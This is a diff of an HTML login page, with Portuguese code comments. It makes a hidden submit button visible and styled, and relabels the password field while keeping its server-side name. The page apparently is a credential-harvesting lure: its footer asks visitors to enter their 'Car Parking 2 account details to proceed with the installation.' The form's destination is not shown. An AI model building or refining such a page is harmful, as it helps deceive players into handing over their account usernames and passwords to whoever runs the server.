@@ -106,9 +106,24 @@
             border-color: #FFC107;
         }
 
-        /* Botão invisível mas clicável para submeter o formulário usando o Enter */
+        /* Estilo do novo botão visível */
         button[type="submit"] {
-            display: none; 
+            margin-top: 15px;
+            padding: 12px 20px;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #000000;
+            background-color: #FFC107; /* Amarelo combinando com o título */
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-transform: uppercase;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #e0a800; /* Fica um pouco mais escuro ao passar o mouse */
         }
 
         .footer-text {
@@ -135,14 +150,17 @@
                 <input type="text" id="usuario" name="usuario" required>
             </div>
             <div class="input-group">
-                <label for="senha">senha:</label>
+                <label for="senha">password:</label>
+                <!-- O texto na tela muda, mas mantivemos id e name como "senha" para o servidor continuar funcionando -->
                 <input type="password" id="senha" name="senha" required>
             </div>
-            <button type="submit">Entrar</button>
+            
+            <!-- Novo botão visível e estilizado -->
+            <button type="submit">enter</button>
         </form>
 
         <!-- Texto Inferior -->
-        <p class="footer-text">Enter your Car Parking 2 account details to proceed with the installation.      olzhass</p>
+        <p class="footer-text">Enter your Car Parking 2 account details to proceed with the installation.</p>
     </div>
 
 </body>
